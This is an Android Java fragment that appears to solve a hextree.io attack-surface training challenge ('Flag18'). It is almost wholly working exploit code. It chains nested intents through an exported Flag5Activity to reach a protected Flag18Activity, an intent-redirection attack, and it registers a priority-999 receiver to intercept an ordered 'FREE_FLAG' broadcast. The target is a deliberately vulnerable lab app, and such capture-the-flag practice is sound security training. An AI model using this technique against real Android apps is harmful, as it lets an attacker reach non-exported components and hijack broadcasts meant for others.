package com.appdev.intentattacks;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.fragment.app.Fragment;

public class Flag18Fragment extends Fragment {

    private static final String ACTION_FREE_FLAG = "io.hextree.broadcast.FREE_FLAG";

    private final BroadcastReceiver flagReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Utils.showDialog(context, intent);
            setResultCode(1);
        }
    };

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag18, container, false);

        Button launchButton = view.findViewById(R.id.btnLaunchFlag18);
        launchButton.setOnClickListener(v -> {
            // Register receiver before launching the activity
            IntentFilter filter = new IntentFilter(ACTION_FREE_FLAG);
            filter.setPriority(999); // High priority for ordered broadcast
            // Compatibility for API < 26
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                requireContext().registerReceiver(flagReceiver, filter, Context.RECEIVER_EXPORTED);
            }

            // Nested intent chain to reach Flag18Activity
            Intent intent1 = new Intent();
            Intent intent2 = new Intent();
            Intent intent3 = new Intent();

            intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
            intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
            intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag18Activity"));
            intent3.putExtra("reason", "next");
            intent2.putExtra("nextIntent", intent3);
            intent2.putExtra("return", 42);
            intent1.putExtra("android.intent.extra.INTENT", intent2);

            startActivity(intent1);
        });

        return view;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        try {
            requireContext().unregisterReceiver(flagReceiver);
        } catch (IllegalArgumentException e) {
            Log.w("Flag18Fragment", "Receiver already unregistered or never registered.");
        }
    }
}
